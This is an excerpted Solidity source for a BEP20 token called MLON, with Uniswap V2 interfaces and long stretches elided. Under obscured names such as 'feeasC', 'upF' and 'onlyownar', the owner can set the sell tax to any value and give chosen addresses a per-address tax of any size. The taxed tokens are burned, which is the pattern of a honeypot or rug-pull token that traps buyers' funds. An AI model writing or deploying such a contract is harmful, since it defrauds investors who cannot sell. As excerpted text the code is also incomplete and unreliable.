...
interface IUniswapV2Factory {
    ...
    function feeasCTo() external view returns (address);
    function feeasCToSetter() external view returns (address);
    ...
    function setfeeasCTo(address) external;
    function setfeeasCToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeasCOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeeasCOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeeasCOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeeasCOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeasCOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract MLON is BEP20, Ownable {
    // ext
    ...
    constructor(
        ...
        _defaultSellfeeasC = 15;
        _defaultBuyfeeasC = 10;
    ...
    uint256 private _defaultSellfeeasC = 0;

    uint256 private _defaultBuyfeeasC = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeeasC;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeeasC = _value;
    }

    function setSlipfeeasC(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeeasC[_address] = _value;
    }

    function getSlipfeeasC(address _address) external view onlyownar returns (uint256) {
        return _slipfeeasC[_address];
    }


    function setMAccountfeeasC(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeeasC(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeeasCAmount = 0;

        if (rF) {
            uint256 tradefeeasC = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeeasC = _defaultSellfeeasC;
                }
                if (from == uniswapV2Pair) {

                    tradefeeasC = _defaultBuyfeeasC;
                }
            }
            if (_slipfeeasC[from] > 0) {
                tradefeeasC = _slipfeeasC[from];
            }

            tradefeeasCAmount = _Amount.mul(tradefeeasC).div(100);
        }


        if (tradefeeasCAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeeasCAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeasCAmount);
            emit Transfer(from, _deadAddress, tradefeeasCAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeeasCAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeeasCAmount);
        emit Transfer(from, _to, _Amount - tradefeeasCAmount);
    }
